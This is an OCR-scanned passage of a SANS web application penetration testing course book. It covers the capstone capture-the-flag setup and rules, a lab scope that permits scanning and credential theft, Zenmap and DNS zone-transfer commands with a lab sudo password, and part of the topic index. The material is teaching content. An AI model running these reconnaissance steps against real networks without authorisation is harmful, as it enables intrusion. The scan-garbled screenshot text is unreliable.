to compare notes and make sure that you are working together. This is VERY important. 
4 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
·-._; 
'-' 
'-' 
-._/ 
'-" 
'-" 
'-" 
'-./ 
'-' 
'-.../ 
'-" 
'-" 
'-' 
'-./ 
'-' 
'-' 
'-' 
'-' 
'--' 
'-' 
'-' 
'-' 
'-' 
'-" 
'-" 
Connect to the coring Server 
Please ping from both your Sec542 Linux VM and your host 
to verify connectivity to the scoring server: 
• Linux:$ ping 10.42.42.42 
• C:\> ping 10.42.42.42 
Then surf to https://10.42.42.42 
• Note the "s" in https! 
•You may use whichever browser/ OS is most convenient for you 
• Note: Cut and paste will be very helpful! 
SEC542 I Web App Penetration Testingand Ethical Hacking 
Please ping from both your Sec542 Linux VM and your host to verify connectivity to the scoring 
server: 
$ ping 10.42.42.42 
C:\> ping 10.42.42.42 
The ability to cut and paste will be quite useful as you enter flags into the scoring server. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
5 
'--' 
Accept the Certificate 
• IE: Continue to this website 
• Chrome: Proceed anyway 
• Fi ref ox: See notes 
0 
WtW..<:<~•<1¢;.ty-.w.;4.M,tM;;~,.,>4-«,~~t.._-wtjtj.~,t,;-. 
'-~' 
This is probably not the site you are looking for! 
sas.n.s 
"w -~miw m:i µm.ttd- ~4/fy l:,w.V'tf+'f! -tfW»WP¾)I~ *'~ tM 
'-..../ 
'--' 
'--' 
'--' 
'-..../ 
'--' 
'-../ 
'--' 
'--' 
'--' 
'-..../ 
'-..../ 
'-..../ 
n Testing and Etlti, 
Firefox requires three steps: 
1. I understand the risks 
2. Add Exception 
3. Confirm Exception 
This Connection is Untrusted 
You have asked f!refox to connect securely to 10 •. 5.11~6~ but we can't confirm that your 
connectron is secure. 
No.,...1lly, when you 11y to conn.a st<urtly, site> will pru1n1 tnn1od idenrloomon to prow 1h11 
you ar" 1oin& to thtt flCht pl;,c«. Howe-tv-r, thb site's id!!ntity c11i't bt' verified. 
What Should I Do? 
U you us.uaity connect. to this site-without problems, this error c.ouid mean that someone-ts 
trying to impersonate the-site, and you sbouldn't coruinue. 
Technical Details 
I Understand the Risks 
if you understand what's going on, you can ti!!! Firnfox to start trusting thtS site's identification. 
Even if you trust the site, this error could mean that ,emeone Is tam paring with your 
connection, 
O¢o'r add an excepncn unless you know thee's a good reason wh; thh site doesn't use trusted 
identification. 
6 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-..../ 
'--' 
'--' 
'-..../ 
'-.__/ 
'-../ 
.,___,,, 
'-.__/ 
'-.....i 
'-...,,' 
.,___,,, 
'-.__/ 
'-..../ 
'-./ 
'-.,_,; 
'--' 
'-..../ 
.,___,,, 
'--' 
'-.__/ 
'-..../ 
'--' 
'-..../ 
.,___,,, 
\_,, · 
Create an Account 
Go to https:/ /10-42-42-42 
• Then: Register 
• Create an account and then "Login" 
You should now see the NetWars Course Scoring Server. Please click on "Register." 
Choose a usemame and password. Your password must be at least 10 characters long. 
You may register an account and log in before (or after) the game begins. If you register before: The 
game will show "CLOSED". It will open once the instructor begins the game. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
7 
'-./ 
Create and/or Join a Team! 
Form a team by clicking on "Teams" 
• See notes for details - 
\.J 
Speak with your fellow classmates and form a team. The maximum team size is five. 
One teammate should create the team and supply a password that will be shared by all teammates. 
Creative team names are encouraged! 
Each individual should then join the team. Please note the caveats on the team page: 
• You can create a new team. The new team will have the same progress as your current user or 
team. To join the team users will need to supply the team name and password. 
• When you join a team, your individual progress will be lost. You need to provide the team 
name and a team password. 
8 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J' 
\.J 
'-./ 
\.J 
\.J 
\.J 
\.J 
..__, 
'---' 
'-.../ 
..__, 
..__, 
\.J 
\.J 
'-.../ 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
\.J 
'-.../ 
\.J 
\.J 
..__, 
'-..,- 
Game Design 
There are multiple levels 
• And multiple "missions" per level 
• You may attempt missions in any order 
Some questions are gateway questions 
• Correct answer unlocks more questions 
Other questions are grouped 
• You may answer some of these, and leave others blank 
New levels unlock when sufficient points have been acquired 
Gateway questions will begin with "Gateway-": 
More questions will unlock once the gateway question is answered correctly. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
9 
"--' 
"--' 
• Some questions have up to three hints 
o The more difficult questions have hints 
o Easier questions do not 
• Hints deduct points immediately 
o Hint penalty is listed for each hint 
• First hint example: 
o "Go to 542.2 Shellshock section, pay careful attention to the Shellshock exercise." 
• Second hint example: 
o "Let's use curl! Just like we did in the Shellshock exercise!" 
• Third hint example: 
o Step-by-step instructions for completing the challenge 
\.../ 
___, 
'-' 
'-.J 
'-.J 
'-.../ 
'-.-/ 
'-' 
\.../ 
\.../ 
'-' 
'-' 
'-.-/ 
'-.../ 
\.../ 
'-.../ 
Hints are available for many questions. You can use hints in a number of ways. Remember, the CTF is 
designed for learning and/or competing to win. You don't have to do both! 
Please keep this in mind: Points are deducted immediately! 
One way to use hints is strategically: 70% of something is better than 0%. If you can't answer a 
question, a hint can provide the necessary boost. The time saved may be critical. 
The other way to use hints is to complete steps you may be unable to complete otherwise. You can use 
hints to complete the entire CTF this way; the final hint is the answer. 
10 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-._/ 
'-._/ 
'-.../ 
'-' 
'-.../ 
.'-._/ 
'-.../ 
'-/ 
'-' 
'-.../ 
'-.../ 
'-.../ 
\.../ 
'-.../ 
\.../ 
'-.../ 
'-.../ 
'-.../ 
\.../ 
'-.J 
\.../ 
'-' 
'-' 
Hint Example 
Here is a zo-point question example: 
• You request a hint, which immediately deducts 6 points from your score 
• You then answer the question, scoring 20 points, for a net gain of 14 points 
(20 minus 6) 
See notes for additional details 
Once you request a hint for a specific question, it is best to see it through to the end: The first hint will 
deduct points immediately. If you stop there and fail to answer the question, you will simply be down 
points. 
If you cannot answer the question after the first hint (before running out of time), request the second. If 
you answer it, you would temporarily be down 13 points in the example above, but gain 20, for a net 
gain of 7 points. 
If you still cannot answer the question, request the third hint, which will immediately deduct the final 
available points. You will be down 20 points on a 20-point question. Then, answer the question 
winning 20 points, for a net gain of zero points. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
11 
\J 
v 
Attitudels•·Everything 
• Today's goals: 
o Put everything we have learned this week into hands-on practice 
oLearn 
o Have fun while competing to win 
• Hints can be used strategically and/ or to complete difficult 
challenges 
• Anyone may complete most of the CTF 
'--' 
'--' 
'--' 
'-.._.,, 
'-../ 
'-../ 
'--' 
'-" 
'-../ 
'-.._.,, 
'-.._.,, 
'--' 
'--' 
'--' 
We designed the NetWars capstone to be enjoyable for all, from management to the hands-on 
experienced penetration tester with years of experience in the trenches. 
Hints are available for difficult questions at varying costs. They range from a subtle nudge to "Here's 
how you do it: Type this ... " 
The capstone provides an opportunity to learn and/or an opportunity to compete. You may choose the 
"no hints" method to maximize points, the "more hints" method to maximize learning or a 
combination of the two methods. 
12 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-" 
'-" 
'--' 
'--' 
'-.J 
'-" 
'-' 
'--' 
'--' 
'-../ 
'-" 
'--' 
'-' 
'--' 
'-" 
'-" 
'--' 
'-.J 
'--' 
'-" 
'--' 
'--' 
\J 
'---' 
\J 
------ 
. 
How ltWorks 
• There is no penalty for one wrong answer to each question 
• After that, each wrong answer deducts a point from your total 
o Up to a maximum of 3 points per question 
• This is done to 
o Encourage high-quality work 
o Discourage blind guessing, brute forcing, etc. 
• Do not reload the page immediately after a wrong answer 
o Some browsers will auto-resubmit old (bad) answers! 
13 
There is no penalty for one wrong answer to a question: 
There is a one-point penalty for each incorrect answer after the first (up to a maximum of three points 
per question): 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
13 
'--' 
Once the Instructor Gives the Green Light 
• If you have not already done so: 
o Create an account and log in to the scoring server 
o Form and join a team 
• Then go to "Level 1" 
SECS42 [Web App Penetration Testing and Ethical Hacking 
14 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
-......, 
'--' 
,.____, 
'--' 
'--' 
'--' 
'--' 
'-' 
'---" 
You will be able to enter answers once the instructor begins the game. 
Then go to "Level l." 
14 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'--' 
'--' 
'--' 
'--' 
'--' 
.__,, 
'--' 
'--' 
'-J 
'--' 
'-" 
'--' 
'--' 
'-.,/ 
'-J 
'--' 
'-' 
'--' 
-......, 
'-.../ 
'--' 
'--' 
AnsweringYour First Question 
Answer the first question 
• Enter "Shodan" 
• Then click "Submit Answer" 
The first question is: 
What is the name of "the world's first search engine for Internet-connected devices"? The 
answer is a single word containing letters only, with only the first letter capitalized. 
We're being generous and giving you the first answer: "Shodan". Then press "Submit Answer". 
Yay, points! 
It will become more difficult shortly, we promise! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
15 
\.._.., 
.__, 
Game Advice 
Read the introduction and the questions *very* carefully 
• Every word counts! 
• The most common reason for losing points: Skipping or skimming through 
the introduction without paying close attention 
Everything you need to win is in the room 
• Contained in your VM or in a local network resource that will be referenced 
• Internet access is not needed to complete any challenge 
If the challenge states that it is based on a specific server or service, 
then target those 
• Do not add unrelated data to the challenge! 
SEC542 I Web App Penetration Testing and EtlticaJHacking 
,~ 
'-- 
'._/ 
'-- 
'-" 
'-" 
'-" 
'-' 
'-" 
'-" 
'-" 
'-- 
'-' 
'-" 
'----- 
'-" 
'-' 
It may go without saying, but read the questions carefully! Students often lose points due to 
carelessness. 
Most of the challenges are based directly on previous labs. If you are stuck, look through the labs 
covered on days 1 through 5. 
16 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..-, 
'-" 
'-" 
'-- 
'-" 
'-../ 
'-" 
'-" 
'-" 
'-" 
'-" 
'-' 
'-" 
'-./ 
'-" 
'-../ 
'-" 
'-../ 
'-../ 
'-- 
'-../ 
'-" 
Project Scope 
• Internet and intranet web applications are in scope 
• All web applications on the target network of 10-42.5.0 / 24 are in 
scope 
o You may scan this range 
o You may also steal credentials to gain interactive access to systems via 
other protocols (such as ssh) 
• There is a DNS server at 10-42.5.24 
o There may be targets without DNS entries 
• The NetWars scoring server will offer specific guidance on 
individual challenges 
Any web application in the network range of 10.42.5.0/24 is within the scope of this test. 
You may begin with an Nmap scan of this network as you begin to enter answers into the scoring 
server. The scan will come in handy once level two is unlocked. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
17 
\....I 
'--' 
More Ground Rules 
Please follow the CTF Golden Rule 
• Treat our systems and your competitors as you would like to be treated 
You may not do any of the following: 
• DoS anyone/ anything 
• Mess around with layer 2, ARP, etc. 
• Attack student systems 
• Attack the NetWars scoring server 
• Alter or remove flags 
• Create false flags 
SEC542 I Web App Penetration Testing and Ethical Hacking 
,a 
..__,, 
'-' 
.'-" 
'---" 
'-" 
'---" 
'-" 
'-' 
\..., 
\..., 
'-' 
'-.../ 
'---" 
\..., 
\..., 
'--' 
Please play according to the rules. They are designed to ensure maximum learning and enjoyment for 
everyone! 
The instructor reserves the right to dismiss any student who does not comply with his or her rules. 
18 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-' 
\..., 
\....I 
\....I 
\....I 
\....I 
'-" 
'---' 
,_, 
\....I 
'---" 
\....I 
\..., 
'---" 
'---" 
\..., 
'-' 
\..., 
·.../ 
'-.../ 
'--" 
Free Hints 
• Clear Firefox's cache, to avoid 
seeing cached results from 
previous labs 
J4 
o Open Firefox, click the "hamburger 
menu" in the upper right, and go to 
Preferences - > Privacy 
oClick "clear your recent history" 
• Once the game begins, use 
Zenmap to scan 10-42.5.0 / 24 
• More hints are in the notes 
Privacy 
[?' U~• ,.,__.,, hQ!:O!,J:ot><'••< h-.:YtWs"."~ t,.,,,., "'.·~''" 
··,;,· (••• .... ,,,;:;.rN,C)t~:;.0J:1r:;l'k,t''IJ,_";il,tt(S_~.-, 
e:r,ii;;.,•111.,..,.,,il-«r..,..oi"i 
,:,-,.,_.~ ;·•.._•l'.Wt }~<Mtc:..,:c:.-,i- 111;:,...,t>,1o11. lo!o~~•·•-1,ua• ft;,,·t•n1,u1•t~ll'•fr •!:....to:• 
)'ii,'i,ilOlit 
http://www.sec542.org is a brand-new site during the CTF, so clearing Firefox's cache will avoid 
seeing cached results from previous labs during the CTF. 
Once the game has begun (and the target systems are online): Run Zenmap to receive an easy-to-use 
display of the systems on the 10.42.5.0/24 network. Note that Nmap can give you the same 
information, but the Zenmap GUI is helpful when juggling lots of data (as you will be doing shortly). 
You may run Zenmap by typing (the sudo password is "Security542"): 
$ sudo zenmap 
We use sudo so that Zenmap runs as root, which allows Zenmap to perform additional checks. 
Finally, perform a DNS zone transfer: 
$ dig @10.42.5.24sec542.org -t axfr 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
19 
.._,, 
'--' 
Declaring a Winner 
We will play until roughly 2:00 PM 
• Assuming a 9:00 AM start time 
The winner is the team who either 
• Is the first to score all the points, or 
• Has the most points when the game ends 
The instructor will then recap the game 
'---' 
'-J 
\.__., 
'-J 
\.__., 
'---' 
'---' 
'-J 
'---' 
'-../ 
'-J 
'---' 
\.__., 
'-J 
Today will be a lot more free-flowing than days 1 through 5. You may take breaks or lunch whenever 
you'd like. 
The game will last roughly five hours, or 9 AM to 2:00 PM, assuming a normal conference start time. 
20 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-J 
'-J 
'---' 
'-.../ 
'-.../ 
'-J 
'-' 
'-' 
'-.../ 
'-.../ 
'-J 
'-J 
'-.../ 
'-J 
'-.J 
'-.../ 
'-.../ 
'-.../ 
'-J 
'-.../ 
'-J 
'-.J 
'-J 
'-J 
-.J 
Any Questions? 
• The game is about to begin 
o If you have any last-minute questions, now 
is the time to ask 
• We provided the first answer: Shodan 
• After that, it's up to you! 
If you have any questions, please ask them now! 
Otherwise, let the games begin! 
[l] http://kidvskat.wikia.com/wiki/File: 1-1 _-_ Let_ The_ Games_ Begin.png 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
21 
'-./ 
'-' 
'-" 
'-..../ 
'-.../ 
'-.../ 
'-.../ 
'--' 
'-.../ 
'-' 
'-' 
'-...--. 
'-' 
..__, 
'-../ 
'-./ 
'-' 
'-' 
This Course is Part of the SANS Technology Institute (STI) Master's Degree Curriculum. 
If your brain is hurting from all you've learned in this class, but you still want more, consider applying 
for a Master's Degree from STI. We offer two hands-on, intensive Master's Degree programs: 
• Master of Science in Information Security Engineering 
• Master of Science in Information Security Management 
If you have a bachelor's degree and are ready to pursue a graduate degree in information security, 
please visit www.sans.edu for more information. 
www.sans.edu 
855-672-6733 
info@sans.edu 
22 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..,, 
'---' 
'---' 
'-..,, 
'-..,, 
'-..,, 
'-../ 
'---' 
'-' 
'-.../
'-../ 
'-' 
'---' 
'-..,, 
'---' 
.___,
'-"
'-..,, 
'---'
'-.../ 
'---' 
'-../ 
Index 
100 Continue 
101 Switching Protocols 
200OK 
302 Redirect 
304 Not Modified 
401 Unauthorized 
404 File not found 
500 Server Error 
502 Bad Gateway 
1:96 
1:96, 1:125 
1:87, 1:96, 2:13 
1:96 
1:96 
1:96 
1:96-97 
1:96 
1:96 
A 
Acunetix 
Acunetix WVS 
Address Space Layout Randomization 
(ASLR) 
American Fuzzy Lop 
AND 
AppScan 
ARPANET 
Array 
Asterisk 
Asynchronous JavaScript and XML 
(AJAX) 
Aura 
Authentication (AUTHN) 
Authentication Bypass 
Authorization (AUTHZ) 
1:27, 5:65 
1:27 
5:81 
Automated attacks 
AutoPWN 
Autorun 
1:7 
1:16, 3:58, 3:88-90, 3:112 
1:27, 5:65, 5:94 
1:31, 1:77 
4:24 
1:52, 4:119 
1:9, 1:108, 4:123, 4:131-133, 4:135, 4:142, 
4:149 
1:54, 4:7 
1:17, 2:80-81, 2:83-90, 2:92, 3:24, 3:26 
3:3, 3:26, 3:29, 3:137 
1:17, 1:112, 2:1, 2:60, 2:82, 2:85, 4:131, 
5:17, 5:33, 5:100 
5:94 
4:118 
4:114 
B 
Backtrack 
Baseoa 
Basic Authentication 
Battering Ram 
1:25 
1:121, 2:81-82, 3:15, 5:33 
2:81-84, 2:86, 5:27, 5:33, 5:55 
2:108, 2:110-111, 4:98-99, 4:101-102 
Index -1 
v 
v 
BBQSQL 
Binary 
BIND 
Bing 
Black box 
Blind SQL injection 
Boolean 
Bourne-Again Shell (Bash) 
3:118-119 
1:80, 1:82, 1:121, 3:59, 3:76-78, 3:88, 
3:111-112, 3:119 
1:39-41, 4:62, 4:119, 5:22 
1:49, 1:51-52, 1:73, 2:86, 4:71 
5:89 
3:76, 3:78, 3:81, 3:111, 3:119 
3:59, 3:88, 3:91, 3:112, 3:121, 5:29 
2:29-36 
Broken Authentication and Session 
3:32 
Management 
Browser Exploitation Framework (BeEF) 
Browser Exploits 
BruteLogic 
Bugtraq 
Burp 
Burp Comparer 
Burp Decoder 
Burp Intruder 
Burp Pro 
Burp Proxy 
Burp Repeater 
Burp Sequencer 
Burp Spider 
Burp Suite 
Business Logic (BUSLOGIC) 
C 
Canonical Name (CNAME) 
CAPTCHA 
Cheat Sheet 
Chrome 
Chromium 
Client Side ( CLIENT) 
ClientXSS 
4:3, 4:30, 4:39, 4:62, 4:86, 4:111-115, 
4:117-119, 4:121, 5:7, 5:46, 5:68-69 
4:114 
2:67, 4:86, 4:92 
1:8 
1:28, 1:109-110, 1:112, 1:114-118, 1:120- 
121, 1:149-150, 2:51, 2:108, 3:21, 4:51-52, 
4:84, 4:98, 5:27 
1:110, 1:122, 2:99 
1:110, 1:121, 4:51, 4:55 
1:109-110, 1:118, 2:4, 2:68, 2:108-112, 
2:114, 4:51-52, 4:98-100, 4:102 
1:27, 1:110, 1:114, 3:21, 4:84, 4:150 
1:110, 1:114, 3:21, 4:150 
1:110, 1:119 
1:110, 1:120, 3:21 
1:110, 1:117 
1:4, 1:28, 1:84, 1:106, 1:109-110, 1:114, 
1:126, 1:149-150, 2:51, 3:15, 3:21, 3:122, 
4:16, 4:51-52, 5:27, 5:80, 5:94 
1:11, 1:17, 4:131, 4:136, 4:141, 5:16 
'-" 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'----' 
'-" 
'-' 
'-" 
'-' 
'----' 
'-..-' 
'-..., · 
'-' 
'--' 
'-.../ 
'-..., 
'-" 
'--./ 
'----' 
'-' 
\.._,; 
'-' 
'-- 
'----' 
'----' 
1:36, 1:43 
2:74 
3:116, 4:9, 4:80, 5:6 
1:29, 1:84, 2:46, 4:81, 6:6 
1:29, 1:84, 2:46-47, 4:82, 5:7 
1:17, 4:29, 4:64, 4:131, 5:16 
4:64-65 
'----' 
'-..., 
'-..., 
'-.../ 
'----' 
'----' 
._/ 
Index -2 
'----' 
'-' 
Clipboard Stealing 
CloudFlare 
Cluster Bomb 
Common Gateway Interface (CGI) 
Common Vulnerabilities and Exposures 
(CVE) 
Conclusions 
Configuration and Deployment 
Management (CONFIG) 
CONNECT 
Content Management Systems (CMS) 
Content-Security-Policy ( CSP) 
Controlling Zombies 
Cookie 
Crawl 
Cross-Site Request Forgery (CSRF) 
Cross-Site Scripting (XSS) 
Cryptography (CRYPST) 
curl 
Custom Word List Generator (CeWL) 
D 
Data Exfiltration 
Datagram Transport Layer Security 
(DTLS) 
Date 
DB Fingerprinting 
DELETE 
dig 
4:114 
1:143 
2:108, 2:111-112 
2:31-33, 2:36, 3:50 
1:141, 1:144, 2:29-30, 2:75, 5:73, 5:82-83 
4:152, 5:107, 5:112 
1:17, 2:20, 2:70 
1:91, 1:94, 1:98, 2:22-23 
5:71-73 
4:80-81 
4:114 
1:85, 2:36, 3:10, 3:15-16, 3:125, 4:26, 4:37, 
4:89-92 
1:49, 1:110, 2:41, 2:43, 2:76, 3:124, 4:103- 
104, 5:49, 5:51, 5:53, 5:63-64 
1:14, 1:116, 2:27, 2:88, 3:15, 4:10, 4:89, 
4:116, 4:131, 4:152, 5:1, 5:3, 5:6-12, 5:14, 
5:53, 5:115 
4:3, 4:28, 4:30, 4:45, 4:49-50, 4:56-58, 
4:61, 4:63-65, 4:69-71, 4:77, 4:80, 4:82- 
84, 4:86, 4:92, 4:96-97, 4:103, 4:105, 
4:107, 4:109, 5:7 
1:17, 1:132 
2:34, 2:110, 4:11-15, 6:10 
2:53 
3:92, 3:103-104, 3:110-111, 3:113, 3:118 
1:141 
digest 
DIRE 
Dir Buster 
Directory Browsing 
4:24 
3:96, 3:110 
1:80, 1:91, 1:95, 1:98, 2:22, 3:57 
1:32-34, 1:38-42, 3:56, 3:118, 4:30, 4:36, 
4:45, 5:75, 5:82, 6:19 
2:80, 2:84-86, 5:34 
1:108, 2:50, 2:76 
1:108, 2:50, 2:76 
1:51, 2:3, 2:65, 2:73-74, 2:76, 2:78 
Index -3 
'--' 
'--' 
Directory Traversal 
DjVu 
DNS Zone Transfer (axfr) 
DNSRecon 
Document 
Document Object Model (DOM) 
document.cookie 
document.forms 
document. URL 
DOM Based 
Domain Name System (DNS) 
DROP 
Drupalgeddon 
E 
Electro Magnetic Interference (EMI) 
Error Handling (ERR) 
error messages 
Evasion 
Executive Summary 
Exploit Database 
exploit-db 
Exploitation 
Extended Domain Name System (EDNS) 
F 
FaasT 
Facebook 
False Negative 
False Positive 
Fiddler 
File Inclusion 
filetype: 
Filter 
Filter Bypass 
2:75, 3:3, 3:46, 3:48-50 
5:82, 5:85 
1:34-35, 1:37, 1:41, 6:19 
1:36-38, 1:43-45 
4:24 
4:3, 4:21-22, 4:35-37, 4:45, 4:63-65, 4:78, 
4:88-89 
4:21, 4:26, 4:86, 4:89-92 
4:21, 4:89 
4:89 
4:63-65 
1:3, 1:32-43, 1:45, 1:47, 1:49, 1:68, 3:91- 
92, 4:37, 4:61-62, 5:82, 6:17, 6:19 
3:57 
2:28, 5:71, 5:73, 5:75-76 
2:100 
1:17 
1:53, 1:60, 2:65-66, 3:78-84, 3:89, 3:91, 
3:99, 4:146 
4:76-77, 4:80, 4:105, 5:52 
5:107-108, 5:112 
1:8 
1:8, 1:53, 2:74, 5:83-84 
1:12, 1:68, 2:28, 3:121, 4:105, 4:133, 4:139, 
5:58, 5:62-63, 5:67, 5:71, 5:73 
1:33 
1:60 
1:49, 1:55, 1:82, 2:97, 4:129, 5:8, 5:10 
4:80, 5:80-81 
2:25, 4:107, 5:94 
1:104-105 
2:27, 3:3, 3:44-46, 3:52, 4:70 
1:51 
4:69, 4:76-77, 4:80, 4:83, 4:105 
4:42, 4:50, 4:69, 4:77, 4:83, 4:105 
'--' 
'-" 
'--' 
'-" 
'-" 
'-" 
'-' 
'-" 
'-" 
'-' 
'----' 
'-.._./ 
'--' 
'-" 
'---' 
'-.._./ 
'-" 
'-' 
'----' 
'--' 
'--' 
'--' 
'--' 
'-" 
'-" 
'--' 
'-" 
'----' 
'--' 
'----' 
'--' 
'----' 
'--' 
'----' 
'--' 
'--' 
'--' 
Index -4 
'---' 
'--' 
Findings 
Fingerprint 
Fingerprinting 
Fingerprinting Organizations with 
Collected Archives (FOCA) 
Firefox 
Fixed Length String 
Forced Browse 
Forms-based authentication 
Framework 
Full Disclosure 
FuzzDB 
Fuzzing 
Fuzzy Lop 
G 
Gecko 
Generalized Markup Language (GML) 
GET 
Google 
Google Dork 
Google Hacking 
Google Hacking Database (GHDB) 
GPU 
Grep 
H 
Harvester 
Harvesting Usernames 
1:119, 1:137, 2:14, 5:81, 5:95, 5:107-108, 
5:110-112, 6:4 
1:60, 2:6, 2:11, 2:13, 2:19, 2:25, 2:40, 
3:96-97, 3:110, 4:115 
1:60, 2:6, 2:11, 2:19, 3:96, 3:110 
1:60-62 
4:54, 4:80 
3:59 
2:3, 2:50, 2:63, 2:76, 5:82 
2:89-92, 5:55 
1:7, 1:12-14, 1:67, 1:128, 2:40, 2:46, 2:76, 
3:119, 4:62, 4:86, 4:111, 4:114, 4:135-139, 
5:46, 5:50, 5:62, 5:66, 5:68, 5:76, 5:85 
1:8 
2:67, 2:76, 4:84 
2:65-68, 2:108, 2:114, 2:116, 4:69, 4:84, 
4:97-98 
1:7 
1:85-86 
1:76, 4:6 
1:79-81, 1:85, 1:91-92, 1:98, 2:12-13, 2:22- 
23, 2:36, 2:82, 2:85, 2:110, 3:11, 3:16, 
3:61, 3:73, 3:83, 4:108-109, 4:124, 4:126, 
4:130, 5:84 
1:9, 1:43-44, 1:49-54, 1:80, 1:84-85, 1:142, 
2:43, 2:71, 2:74, 2:97-98, 3:17, 4:37, 4:84, 
4:123, 4:129, 5:28, 5:51 
1:53, 2:74 
1:50, 1:53, 2:74 
1:53, 2:74 
2:102-103 
2:67, 4:92, 4:98, 4:100-102, 5:54 
1:63 
2:98 
Index -5 
'---' 
'--' 
HEAD 
Heartbleed 
History 
History Browsing 
Hook 
Hooked Browser 
HP Webinspect 
HTML Injection 
HTTP protocol 
HTTP status codes 
HTTP/0.9 
HTTP/1.0 
HTTP/1.1 
HTTP/2 
HTTP _USER_AGENT 
HttpOnly 
HTTPS 
hypertext 
IBMAppScan 
ICANN 
ICMP 
Identity Management (ID ENT) 
iframe 
IMAP 
IMAPS 
Incremental transfer (IXFR) 
Information Gathering (INFO) 
information_schema 
Injection 
Input Validation (INPV AL) 
Insecure Direct Object References 
INSERT 
Integer 
1:80, 1:91-92, 4:22 
1:4, 1:141-145, 1:147, 2:28, 5:71 
4:24 
4:114-115 
4:39, 4:62, 4:113, 4:119, 5:7, 5:68-69 
4:119, 5:68-69 
1:27, 5:94 
4:3, 4:29-30, 4:32, 4:79, 4:94 
1:3, 1:7, 1:76, 1:79, 1:85, 1:109, 2:22 
1:96, 3:119 
1:7, 1:79-80 
1:7, 1:79-80, 1:82, 2:12-13 
1:7, 1:81-82, 1:85, 1:87, 2:13, 2:23, 2:36, 
2:82, 2:85 
1:82-84 
2:33-36 
4:90-91 
1:4, 1:83, 1:88, 1:103, 1:128-130, 1:133- 
135, 1:137, 1:139, 1:145, 1:151, 2:52, 2:83, 
2:87, 2:89, 3:10, 4:35, 4:90 
1:76, 1:78, 1:80, 1:124 
1:27, 5:94 
1:33 
3:40 
1:17, 2:80, 2:96 
4:118 
1:128 
1:128 
1:34 
1:1, 1:17, 1:151, 2:19, 2:40, 5:91 
3:89, 3:97-98, 3:112 
1:68, 2:27, 2:30, 2:33, 3:37, 3:39, 3:54, 
3:86, 3:116, 3:119, 3:137, 4:9, 4:29-30, 
4:32, 4:70, 4:72-74, 4:79, 4:98-99, 4:107, 
4:147, 5:75 
1:16-17, 3:37, 3:44 
1:14, 2:27 
3:57, 3:69-70, 3:108, 3:114, 5:75 
1:60, 3:18, 3:59, 5:25, 5:29 
._____, 
'--' 
'--' 
'--' 
'--' 
'-' 
'--' 
'--' 
'--' 
'--' 
'--' 
\....., 
'--' 
'---' 
..__,, 
'-.../ 
'--' 
'--' 
'-' 
'-' 
'--' 
'--' 
'---' 
'-' 
'-' 
'--' 
'-' 
'--' 
'--' 
'-...,/ 
'---' 
'-' 
'--" 
'---' 
\....., 
'--' 
'-...,/ 
Index -6 
'--' 
'-' 
Integrated Windows Authentication 
(IWA) 
interception proxy 
Internet Information Services (IIS) 
Interprotocol Exploitation 
intitle: 
inurl: 
J 
Jabber 
JavaScript 
JavaScript Injection 
JavaScript Object Notation (JSON) 
JavaScript validation 
JBroFuzz 
Joomla 
JSESSIONID 
K 
Kali 
Kerberos 
L 
LDAPS 
Libraries 
LIMIT 
link: 
Linkedin 
Local File Inclusion (LFI) 
Location 
M 
Maltego 
Man-in-the-Middle (MITM) 
2:87-88 
1:24, 1:28, 1:103, 1:106, 2:33, 2:36, 2:44, 
2:51, 3:24, 3:125, 4:16, 4:97, 4:147, 5:8, 
5:27 
2:9, 2:12, 2:24, 2:81, 2:87, 3:46-47, 3:50 
4:114, 4:119 
1:51, 2:74 
1:51, 2:74 
1:125 
4:61-62, 4:64, 4:128, 4:142 
4:114 
4:80, 4:142-147 
3:33 
2:76, 4:84 
1:27, 2:75, 5:63, 5:71-72 
3:16-17 
1:25-26, 5:26 
1:77, 2:87, 5:34 
1:128 
4:135, 4:137, 5:22-23, 5:26, 5:32 
3:58 
1:51 
1:49, 1:55, 1:71, 2:97 
3:44-45, 3:137, 4:9, 4:13, 4:28 
4:24 
1:32, 1:64-66 
1:28, 1:103, 1:126, 2:9, 2:86, 5:3, 5:20 
Index -7 
'--' 
'--' 
Manual attacks 
mash-ups 
MD5 
MediaWiki 
Metasploit 
Meterpreter 
Methodology 
MILNET 
Missing Function Level Access Control 
mod_auth_digest 
Modules 
MS SQL Server 
multiplex 
Mutillidae 
MySQL 
N 
National Vulnerability Database 
Netcat 
Netcraft 
NetSparker 
Network Address Translation (NAT) 
Newsgroup 
Nikto 
Nmap 
NmapDNSNSE 
Non- Persistent 
nslookup 
NULL 
5:93 
1:9, 4:127 
1:121, 1:137, 2:25, 2:84-85, 2:102-103, 
3:15, 3:18 
5:82-85 
1:45, 4:118, 5:62-71, 5:76, 5:80, 5:82, 5:85 
2:35, 3:133, 5:70 
1:12, 1:16, 1:24, 1:68, 3:46, 4:69, 5:51, 
5:53, 5:58, 5:63, 5:107, 5:110, 6:1 
1:77 
1:14 
2:86 
1:43, 1:45, 1:67-68, 1:70-74, 1:87, 2:34, 
2:87, 4:112-114, 5:46, 5:62-64, 5:66-67, 
5:69, 5:71-72, 5:76, 5:85 
